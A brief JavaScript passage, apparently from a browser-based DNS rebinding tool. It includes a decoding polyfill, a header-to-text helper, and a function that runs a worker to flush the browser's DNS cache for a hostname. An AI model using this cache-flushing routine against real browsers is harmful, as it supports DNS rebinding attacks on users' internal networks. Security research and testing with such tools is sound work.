        return originalAtob(inputString).replace(/[\xc0-\xff][\x80-\xbf]*/g, atobReplacer);
    };
})(typeof global == "" + void 0 ? typeof self == "" + void 0 ? this : self : global);

function flushBrowserDnsCache(hostname) {
    let worker = new Worker('flushdnscache.js');
    let params = {};
    params.hostname = hostname;
    params.port = document.location.port;
    params.iterations = 1000;
    worker.postMessage(params);
}

function httpHeaderstoText(headers) {
    out = "";
    for (let pair of headers.entries()) {
        out = (`${out}\n${pair[0]}: ${pair[1]}`);
    };
    return out;
}

let Registry = {};
